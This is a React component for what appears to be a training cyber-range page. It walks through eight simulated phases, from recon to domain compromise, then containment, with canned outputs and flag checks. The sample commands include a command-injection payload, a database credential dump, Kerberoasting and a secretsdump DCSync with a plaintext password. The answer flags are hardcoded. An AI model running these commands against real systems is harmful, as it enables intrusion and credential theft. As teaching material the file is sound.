import React, { useState } from 'react';
import { useApp } from '../context/AppContext';
import {
  ShieldAlert,
  Terminal,
  Activity,
  Network,
  Server,
  Layers,
  CheckCircle2,
  AlertTriangle,
  FileText,
  Bot,
  Zap,
  ArrowRight,
  RotateCcw,
  Sparkles,
  Lock,
  Compass,
  Cpu,
  Database,
  Globe
} from 'lucide-react';

interface RangePhase {
  phaseNumber: number;
  title: string;
  targetVlan: string;
  targetIp: string;
  description: string;
  objectives: string[];
  terminalPrompt: string;
  sampleCommand: string;
  expectedOutput: string;
  flagKey: string;
  flagValue: string;
  xp: number;
}

const MASTER_RANGE_PHASES: RangePhase[] = [
  {
    phaseNumber: 1,
    title: 'Perimeter Reconnaissance & OSINT',
    targetVlan: 'VLAN 10 — External DMZ',
    targetIp: '198.51.100.10',
    description: 'Perform passive and active discovery against the authorized perimeter. Map open ports, web interfaces, and DNS records.',
    objectives: [
      'Execute nmap scan against 198.51.100.10',
      'Discover exposed HTTP (80/TCP) and HTTPS (443/TCP) services',
      'Identify web framework headers'
    ],
    terminalPrompt: 'range-operator@kali:~$',
    sampleCommand: 'nmap -sV -sC -p 80,443 198.51.100.10',
    expectedOutput: `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for border-portal.corp.local (198.51.100.10)\nHost is up (0.0021s latency).\nPORT    STATE SERVICE  VERSION\n80/tcp  open  http     nginx 1.24.0\n443/tcp open  ssl/http Apache/2.4.52 (Ubuntu) OpenSSL/3.0.2\n|_http-title: Nightfall Defense Perimeter Portal\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nFLAG{NIGHTFALL_PERIMETER_RECON_CLEAR}`,
    flagKey: 'flag_phase1',
    flagValue: 'FLAG{NIGHTFALL_PERIMETER_RECON_CLEAR}',
    xp: 200
  },
  {
    phaseNumber: 2,
    title: 'DMZ Web Exploit & Initial Access',
    targetVlan: 'VLAN 10 — External DMZ',
    targetIp: '198.51.100.10',
    description: 'Identify unauthenticated endpoint on web server and leverage vulnerability to obtain low-privilege shell as www-data.',
    objectives: [
      'Locate file upload / parameter injection vector',
      'Bypass extension blacklist',
      'Obtain interactive reverse shell'
    ],
    terminalPrompt: 'range-operator@kali:~$',
    sampleCommand: 'curl -X POST http://198.51.100.10/api/v1/diagnostics -d "test=127.0.0.1;id;uname -a"',
    expectedOutput: `uid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux dmz-web-01 5.15.0-89-generic #99-Ubuntu SMP x86_64\n\nFLAG{DMZ_INITIAL_FOOTHOLD_ACQUIRED}`,
    flagKey: 'flag_phase2',
    flagValue: 'FLAG{DMZ_INITIAL_FOOTHOLD_ACQUIRED}',
    xp: 250
  },
  {
    phaseNumber: 3,
    title: 'Local Privilege Escalation on DMZ Host',
    targetVlan: 'VLAN 10 — External DMZ',
    targetIp: '10.10.10.105 (Internal NIC)',
    description: 'Inspect cron jobs, SUID binaries, and sudo configurations to elevate www-data to root on dmz-web-01.',
    objectives: [
      'Audit /etc/crontab and /var/log/syslog',
      'Locate world-writable maintenance script executed by root',
      'Obtain root shell'
    ],
    terminalPrompt: 'www-data@dmz-web-01:/var/www/html$',
    sampleCommand: 'cat /etc/crontab',
    expectedOutput: `* * * * * root /usr/local/bin/sync_metrics.sh\n# World-writable file located at /usr/local/bin/sync_metrics.sh\nRoot execution confirmed.\n\nFLAG{DMZ_ROOT_PRIVILEGE_UNLOCKED}`,
    flagKey: 'flag_phase3',
    flagValue: 'FLAG{DMZ_ROOT_PRIVILEGE_UNLOCKED}',
    xp: 250
  },
  {
    phaseNumber: 4,
    title: 'Internal Network Discovery & Pivot Routing',
    targetVlan: 'VLAN 20 — Internal Server Farm',
    targetIp: '10.10.20.0/24',
    description: 'Setup SSH dynamic SOCKS proxy or Chisel tunnel through dmz-web-01 to reach VLAN 20 and discover internal database.',
    objectives: [
      'Deploy Chisel reverse tunnel on port 8000',
      'Scan internal 10.10.20.0/24 through proxychains',
      'Discover internal database host at 10.10.20.15'
    ],
    terminalPrompt: 'root@dmz-web-01:~#',
    sampleCommand: 'proxychains nmap -sT -Pn -p 3306,5432,1433 10.10.20.15',
    expectedOutput: `[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.20.15:5432  ...  OK\nPORT     STATE SERVICE\n5432/tcp open  postgresql\n\nFLAG{PIVOT_TUNNEL_ESTABLISHED_VLAN20}`,
    flagKey: 'flag_phase4',
    flagValue: 'FLAG{PIVOT_TUNNEL_ESTABLISHED_VLAN20}',
    xp: 250
  },
  {
    phaseNumber: 5,
    title: 'Database Compromise & Credential Harvest',
    targetVlan: 'VLAN 20 — Database Tier',
    targetIp: '10.10.20.15 (corp-db-internal)',
    description: 'Authenticate to PostgreSQL using discovered config credentials and extract user credentials and Kerberos hashes.',
    objectives: [
      'Connect via psql using credentials from /var/www/html/config.php',
      'Dump sys_users table',
      'Recover Service Account NTLM hashes'
    ],
    terminalPrompt: 'range-operator@kali:~$',
    sampleCommand: 'proxychains psql -h 10.10.20.15 -U db_admin -d enterprise_vault -c "SELECT username, password_hash, domain_sid FROM sys_users;"',
    expectedOutput: ` username  |                  password_hash                   | domain_sid \n-----------+--------------------------------------------------+------------\n svc_backup| $krb5tgs$23$*svc_backup$CORP.LOCAL*$MSSQL/db01...| S-1-5-21-..\n\nFLAG{DATABASE_CREDENTIALS_RECOVERED}`,
    flagKey: 'flag_phase5',
    flagValue: 'FLAG{DATABASE_CREDENTIALS_RECOVERED}',
    xp: 300
  },
  {
    phaseNumber: 6,
    title: 'Active Directory Enumeration & Kerberoasting',
    targetVlan: 'VLAN 30 — Active Directory Domain',
    targetIp: '10.10.30.5 (corp-dc01.corp.local)',
    description: 'Execute Kerberoasting attack to request TGS tickets for Service Principal Names (SPN) and crack weak service passwords offline.',
    objectives: [
      'Query Domain Controller via LDAP (Port 389)',
      'Request Kerberos TGS ticket for svc_backup',
      'Crack ticket offline using hashcat'
    ],
    terminalPrompt: 'range-operator@kali:~$',
    sampleCommand: 'proxychains GetUserSPNs.py corp.local/svc_backup -dc-ip 10.10.30.5 -request',
    expectedOutput: `[*] Hash extracted for svc_backup\n[*] Cracking hash with wordlist...\nsvc_backup:Spring2026!Security\n\nFLAG{KERBEROAST_CRACKED_SUCCESS}`,
    flagKey: 'flag_phase6',
    flagValue: 'FLAG{KERBEROAST_CRACKED_SUCCESS}',
    xp: 300
  },
  {
    phaseNumber: 7,
    title: 'Domain Privilege Escalation & DC Shadowing',
    targetVlan: 'VLAN 30 — Active Directory Domain',
    targetIp: '10.10.30.5 (corp-dc01.corp.local)',
    description: 'Use compromised service account permissions to perform DCSync and extract krbtgt NTLM hash.',
    objectives: [
      'Perform secretsdump.py against Domain Controller',
      'Extract Administrator and krbtgt NTLM hashes',
      'Confirm Domain Admin execution'
    ],
    terminalPrompt: 'range-operator@kali:~$',
    sampleCommand: 'proxychains secretsdump.py corp.local/svc_backup:\'Spring2026!Security\'@10.10.30.5 -just-dc-user Administrator',
    expectedOutput: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\nFLAG{ENTERPRISE_DOMAIN_ADMIN_REACHED}`,
    flagKey: 'flag_phase7',
    flagValue: 'FLAG{ENTERPRISE_DOMAIN_ADMIN_REACHED}',
    xp: 400
  },
  {
    phaseNumber: 8,
    title: 'Enterprise Incident Containment & Eradication',
    targetVlan: 'Enterprise Security Grid',
    targetIp: 'All Subnets (10.10.0.0/16)',
    description: 'Switch to the Blue Team Incident Commander role. Deploy network firewall quarantine, reset KRBTGT keys twice, and revoke persistence tokens.',
    objectives: [
      'Isolate compromised DMZ node from internal VLANs',
      'Execute Domain KRBTGT double-reset script',
      'Deploy Sysmon Sigma rule for OGNL injection'
    ],
    terminalPrompt: 'soc-lead@siem-collector:~$',
    sampleCommand: 'iptables -I FORWARD -s 10.10.10.105 -d 10.10.0.0/16 -j DROP && echo "Quarantine Applied"',
    expectedOutput: `Quarantine Applied. Firewall rules deployed.\nKRBTGT password reset sequence complete.\nSigma detection rule ACTIVE in SIEM.\n\nFLAG{ENTERPRISE_CONTAINMENT_VERIFIED}`,
    flagKey: 'flag_phase8',
    flagValue: 'FLAG{ENTERPRISE_CONTAINMENT_VERIFIED}',
    xp: 500
  }
];

export const MasterCyberRangePage: React.FC = () => {
  const { addXp, completeMission, addNotebookNote } = useApp();
  const [activePhaseIndex, setActivePhaseIndex] = useState<number>(0);
  const [flagInputs, setFlagInputs] = useState<Record<string, string>>({});
  const [completedPhases, setCompletedPhases] = useState<Record<number, boolean>>({});
  const [termCommand, setTermCommand] = useState<string>('');
  const [termOutput, setTermOutput] = useState<string>('Connected to Master Cyber Range Terminal v4.8.\nSelect an active phase or enter commands to execute authorized simulations.');
  const [feedback, setFeedback] = useState<string | null>(null);

  const currentPhase = MASTER_RANGE_PHASES[activePhaseIndex];

  const handleRunSample = () => {
    setTermCommand(currentPhase.sampleCommand);
    setTermOutput(currentPhase.expectedOutput);
  };

  const handleFlagSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const inputVal = flagInputs[currentPhase.flagKey]?.trim();
    if (inputVal === currentPhase.flagValue) {
      setCompletedPhases(prev => ({ ...prev, [activePhaseIndex]: true }));
      setFeedback(`PHASE ${currentPhase.phaseNumber} CONFIRMED! Flag accepted. (+${currentPhase.xp} XP)`);
      addXp(currentPhase.xp);
      completeMission(`master-phase-${currentPhase.phaseNumber}`);
      addNotebookNote({
        title: `[MASTER RANGE PHASE ${currentPhase.phaseNumber}] ${currentPhase.title}`,
        content: `Target: ${currentPhase.targetIp} (${currentPhase.targetVlan})\nFlag: ${currentPhase.flagValue}\n\nObjectives Accomplished:\n${currentPhase.objectives.join('\n')}`,
        category: 'Cases',
        tags: ['Master Cyber Range', 'Capstone', `Phase ${currentPhase.phaseNumber}`]
      });
    } else {
      setFeedback('INVALID FLAG: Flag string does not match the captured forensic token.');
    }
  };

  return (
    <div className="space-y-6 pb-12">
      {/* Hero Header */}
      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-red-950/80 via-slate-900 to-slate-950 border border-red-500/40 p-6 shadow-2xl">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-0.5 rounded bg-red-950 text-red-300 border border-red-500/50 text-xs font-mono font-bold uppercase tracking-wider animate-pulse">
                FINAL CAPSTONE CYBER RANGE (LEVEL 31)
              </span>
              <span className="text-xs font-mono text-slate-400">
                MULTI-VLAN ENTERPRISE GRID
              </span>
            </div>
            <h1 className="text-2xl lg:text-3xl font-bold font-mono text-slate-100 tracking-tight">
              MY CYBER LAB Master Range
            </h1>
            <p className="text-sm text-slate-300 max-w-3xl leading-relaxed">
              End-to-end enterprise offensive and defensive campaign: External DMZ Recon → Web Exploit → Privilege Escalation → SOCKS Pivoting → Database Extraction → Kerberoasting → Domain Admin → Enterprise Containment.
            </p>
          </div>

          <div className="p-3.5 rounded-xl bg-slate-950/80 border border-slate-800 text-center">
            <span className="text-[10px] font-mono text-slate-400 block uppercase">Campaign Progress</span>
            <span className="text-xl font-mono font-bold text-cyan-400">
              {Object.values(completedPhases).filter(Boolean).length} / {MASTER_RANGE_PHASES.length}
            </span>
          </div>
        </div>
      </div>

      {/* Network Topology Visualizer */}
      <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800">
        <div className="flex items-center justify-between text-xs font-mono text-slate-400 mb-3">
          <span className="flex items-center gap-2 font-bold text-slate-200">
            <Network className="w-4 h-4 text-cyan-400" />
            <span>ENTERPRISE TARGET SUBNETS</span>
          </span>
          <span className="text-emerald-400">ISOLATED SANDBOX ENVIRONMENT</span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
          <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-1">
            <div className="flex items-center justify-between text-xs font-mono">
              <span className="text-blue-400 font-bold">VLAN 10: DMZ</span>
              <span className="text-[10px] px-1.5 py-0.5 rounded bg-blue-950 text-blue-300">198.51.100.0/24</span>
            </div>
            <p className="text-[11px] text-slate-400">Perimeter Nginx + Apache Struts Portal</p>
          </div>

          <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-1">
            <div className="flex items-center justify-between text-xs font-mono">
              <span className="text-teal-400 font-bold">VLAN 20: DB TIER</span>
              <span className="text-[10px] px-1.5 py-0.5 rounded bg-teal-950 text-teal-300">10.10.20.0/24</span>
            </div>
            <p className="text-[11px] text-slate-400">PostgreSQL 14 + Vault Credential Store</p>
          </div>

          <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-1">
            <div className="flex items-center justify-between text-xs font-mono">
              <span className="text-purple-400 font-bold">VLAN 30: ACTIVE DIRECTORY</span>
              <span className="text-[10px] px-1.5 py-0.5 rounded bg-purple-950 text-purple-300">10.10.30.0/24</span>
            </div>
            <p className="text-[11px] text-slate-400">Windows Server 2022 DC01 (Kerberos/LDAP)</p>
          </div>

          <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-1">
            <div className="flex items-center justify-between text-xs font-mono">
              <span className="text-emerald-400 font-bold">VLAN 99: SOC SIEM</span>
              <span className="text-[10px] px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-300">10.10.99.0/24</span>
            </div>
            <p className="text-[11px] text-slate-400">Suricata + Zeek + Sigma Containment Console</p>
          </div>
        </div>
      </div>

      {/* Main Grid: Phase Stepper & Interactive Terminal */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left: Phase Selector */}
        <div className="lg:col-span-4 space-y-2">
          <span className="text-xs font-mono text-slate-400 uppercase font-bold px-1">
            Campaign Phases:
          </span>
          <div className="space-y-2">
            {MASTER_RANGE_PHASES.map((phase, idx) => {
              const isSelected = idx === activePhaseIndex;
              const isDone = completedPhases[idx];

              return (
                <button
                  key={phase.phaseNumber}
                  onClick={() => {
                    setActivePhaseIndex(idx);
                    setFeedback(null);
                  }}
                  className={`w-full text-left p-3.5 rounded-xl border transition-all flex items-center justify-between gap-3 ${
                    isSelected
                      ? 'bg-red-500/10 border-red-500/50 shadow-md'
                      : 'bg-slate-900/60 border-slate-800 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-mono font-bold ${
                      isDone
                        ? 'bg-emerald-500 text-black'
                        : isSelected
                        ? 'bg-cyan-500 text-black'
                        : 'bg-slate-800 text-slate-400'
                    }`}>
                      {isDone ? '✓' : phase.phaseNumber}
                    </div>
                    <div>
                      <h4 className="text-xs font-mono font-bold text-slate-200">
                        {phase.title}
                      </h4>
                      <span className="text-[11px] font-mono text-slate-400">
                        {phase.targetVlan}
                      </span>
                    </div>
                  </div>

                  <span className="text-[10px] font-mono text-amber-400 font-bold shrink-0">
                    +{phase.xp} XP
                  </span>
                </button>
              );
            })}
          </div>
        </div>

        {/* Right: Active Phase Console & Flag Verification */}
        <div className="lg:col-span-8 space-y-4">
          <div className="p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-500/30 font-bold">
                  PHASE {currentPhase.phaseNumber} OF {MASTER_RANGE_PHASES.length}
                </span>
                <h2 className="text-lg font-mono font-bold text-slate-100 mt-1">
                  {currentPhase.title}
                </h2>
              </div>
              <div className="text-right">
                <span className="text-[10px] font-mono text-slate-400 block">Target Host</span>
                <span className="text-xs font-mono font-bold text-cyan-300">{currentPhase.targetIp}</span>
              </div>
            </div>

            <p className="text-xs text-slate-300 leading-relaxed font-sans">
              {currentPhase.description}
            </p>

            <div className="space-y-2">
              <span className="text-xs font-mono text-slate-400 font-bold uppercase">Tactical Objectives:</span>
              <ul className="space-y-1 text-xs text-slate-300 font-sans">
                {currentPhase.objectives.map((obj, oIdx) => (
                  <li key={oIdx} className="flex items-center gap-2">
                    <CheckCircle2 className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                    <span>{obj}</span>
                  </li>
                ))}
              </ul>
            </div>

            {/* Virtual Interactive Terminal */}
            <div className="space-y-2 pt-2">
              <div className="flex items-center justify-between text-xs font-mono text-slate-400">
                <span className="flex items-center gap-1.5">
                  <Terminal className="w-4 h-4 text-emerald-400" />
                  <span>EMULATED CYBER RANGE SHELL</span>
                </span>
                <button
                  onClick={handleRunSample}
                  className="text-xs text-cyan-400 hover:text-cyan-300 font-mono underline"
                >
                  Autofill Tactical Command
                </button>
              </div>

              <div className="p-4 rounded-xl bg-black border border-slate-800 font-mono text-xs text-emerald-400 space-y-2">
                <div className="flex items-center gap-2 text-slate-400 border-b border-slate-900 pb-1.5">
                  <span className="text-cyan-400 font-bold">{currentPhase.terminalPrompt}</span>
                  <span className="text-slate-200">{termCommand || currentPhase.sampleCommand}</span>
                </div>
                <pre className="whitespace-pre-wrap leading-relaxed max-h-48 overflow-y-auto custom-scrollbar text-slate-300">
                  {termOutput}
                </pre>
              </div>
            </div>

            {/* Flag Submission Form */}
            <form onSubmit={handleFlagSubmit} className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3">
              <label className="block text-xs font-mono font-bold text-slate-300 uppercase">
                Submit Phase Completion Flag:
              </label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={flagInputs[currentPhase.flagKey] || ''}
                  onChange={(e) => setFlagInputs({ ...flagInputs, [currentPhase.flagKey]: e.target.value })}
                  placeholder="FLAG{...}"
                  className="flex-1 bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-cyan-300 focus:outline-hidden focus:border-cyan-500"
                />
                <button
                  type="submit"
                  className="px-5 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white font-mono text-xs font-bold transition-all shadow-md"
                >
                  Verify Flag
                </button>
              </div>

              {feedback && (
                <div className={`p-2.5 rounded-lg text-xs font-mono flex items-center gap-2 ${
                  completedPhases[activePhaseIndex]
                    ? 'bg-emerald-950/40 border border-emerald-500/40 text-emerald-300'
                    : 'bg-red-950/40 border border-red-500/40 text-red-300'
                }`}>
                  {completedPhases[activePhaseIndex] ? <CheckCircle2 className="w-4 h-4" /> : <AlertTriangle className="w-4 h-4" />}
                  <span>{feedback}</span>
                </div>
              )}
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};
